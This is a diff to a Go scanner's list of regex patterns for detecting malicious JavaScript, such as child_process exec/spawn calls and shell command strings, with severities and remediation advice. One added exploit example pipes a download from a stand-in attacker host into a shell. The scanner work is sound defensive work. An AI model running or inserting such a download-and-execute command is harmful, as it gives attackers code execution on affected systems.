@@ -28,11 +28,18 @@ var maliciousJSPatterns = []maliciousJSPattern{
 		Remediation:    "Use higher-level APIs if possible. Ensure all commands are strictly validated.",
 	},
 	{
-		Name:           "exec/spawn call",
-		Pattern:        regexp.MustCompile(`\b(exec|execSync|spawn|spawnSync|execFile|execFileSync|fork)\s*\(`),
+		Name:           "child_process exec/spawn",
+		Pattern:        regexp.MustCompile(`(?:child_process|cp|proc|subprocess)['"\]\s]*\)\s*\.\s*(exec|execSync|spawn|spawnSync|execFile|execFileSync|fork)\s*\(`),
 		Severity:       SeverityHigh,
 		ExploitExample: "require('child_process').execSync('id');",
 		Remediation:    "Use spawn with argument arrays instead of exec with strings to prevent command injection.",
+	},
+	{
+		Name:           "shell command string",
+		Pattern:        regexp.MustCompile(`\b(execSync|spawnSync)\s*\(\s*['"](?:sh|bash|cmd|powershell|/bin/)`),
+		Severity:       SeverityHigh,
+		ExploitExample: "execSync('/bin/sh -c \"curl attacker.com | sh\"');",
+		Remediation:    "Avoid executing shell commands directly. Use spawn with explicit arguments.",
 	},
 	{
 		Name:           "eval usage",
